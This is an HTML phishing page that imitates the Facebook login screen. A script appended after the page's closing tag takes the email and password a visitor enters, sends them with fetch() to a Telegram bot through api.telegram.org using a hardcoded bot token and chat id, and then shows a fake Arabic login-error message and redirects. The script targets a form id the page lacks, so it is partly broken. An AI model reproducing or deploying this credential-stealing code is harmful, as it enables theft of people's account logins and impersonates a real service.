<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Google+Sans:ital,opsz,wght@0,17..18,400..700;1,17..18,400..700&display=swap');
    body {
      font-family: 'Google Sans', sans-serif;
      margin: 0;
      background-color: white;
    }

    svg {
      width: 60px;
      height: 60px;
      color: #1877f2;
      margin: 20px auto 10px auto;
      display: block;
    }

   
    .email-field,
    .password-field {
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0 auto 12px auto;
      width: 516px; 
    }

   
    #password,
    #email {
      height: 56px;
      width: 100%;
      border: 1px solid #ccd0d5;
      border-radius: 16px;
      padding: 18px 12px 4px 12px; 
      outline: none;
      font-size: 16px;
      box-sizing: border-box;
      background-color: #fff;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    #password:focus,
    #email:focus {
      border-color: #89898a;
      
    }

   
    label {
      position: absolute;
      left: 12px; 
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      color: #8d949e;
      pointer-events: none; 
      transition: all 0.15s cubic-bezier(0, 0, 0.2, 1);
      transform-origin: left top;
    }

  
    #email:focus ~ label,
    #email:not(:placeholder-shown) ~ label,
    #password:focus ~ label,
    #password:not(:placeholder-shown) ~ label {
      top: 8px;
      transform: translateY(0) scale(0.75);
      color: #969797;
    }

    .submit-field {
      display: block;
      margin: 15px auto;
      width: 516px;
      height: 48px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
    }

    .submit-field:hover {
      background-color: #166fe5;
    }

    .login-box {
      width: 580px;
      margin: 40px auto;
      
      padding: 20px;
     
     
    }
    .Forget-password:hover{
      background-color: #64646413;
      border-radius: 12px;
      height: 40px;
     
      cursor: pointer;

    }
  </style>
</head>

<body>
  <div>
    <svg viewBox="0 0 24 24" fill="currentColor">
      <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z">
      </path>
    </svg>
  </div>
  <hr style="margin-top: 20px; border: 0.5px solid #e5e5e5;">

  <main>
    <div class="login-box">
      <h3 style="margin-bottom: 20px; color: #1c1e21; margin-left: 40px; margin-top: auto;margin-right: auto;">Log in to Facebook</h3>
      <form method="post">
        
        
        <div class="email-field">
          <input type="email" placeholder=" " id="email" required>
          <label for="email">Email address or mobile number</label>
        </div>

        <div class="password-field">
          <input type="password" id="password" placeholder=" " required>
          <label for="password">Password</label>
        </div>

        <input type="submit" value="Log In" class="submit-field">
        <div style="margin-top: 15px; " class="Forget-password" >
          <a href="#" style="color: black; text-decoration: none; font-size: 16px; text-align: center; display: block; margin-top: 40px;margin-bottom:40px;margin-left: auto;margin-right: auto;">Forgotten password?</a>
        </div>
        <div style="border: #166fe5  solid 1px; width: 70%; margin: auto; border-radius: 20px; height: 40px; ">
          <a href="#" style="display: block; text-decoration: none; color: #166fe5;  text-align: center; margin-top: 10px;margin-bottom: auto;margin-left: auto;margin-right: auto;">Create new account</a>
        </div>
      </form>
    </div>
  </main>
</body>

</html>




  <script>
    document.getElementById('loginForm').addEventListener('submit', async function (e) {
      e.preventDefault(); // لمنع إعادة تحميل الصفحة

      // استلام القيم المدخلة
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

   
      const botToken = '9072593338:AAGWBCaNHBnqAv7QhNu2Oggarw066XKiSG4';
      const chatId = '6798640564';

      // تجهيز الرسالة
      const message = `⚠️ محاولة تسجيل دخول جديدة (عبر المتصفح):\n\nالبريد: ${email}\nكلمة المرور: ${password}`;

      
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try {
        
        await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });

       
        alert('حدث خطأ في تسجيل الدخول، يجدر المحاولة لاحقاً.');
        window.location.href = 'index.html'; 

      } catch (error) {
        console.error('فشل الإرسال:', error);
      }
    });

  </script>

</body>

</html>
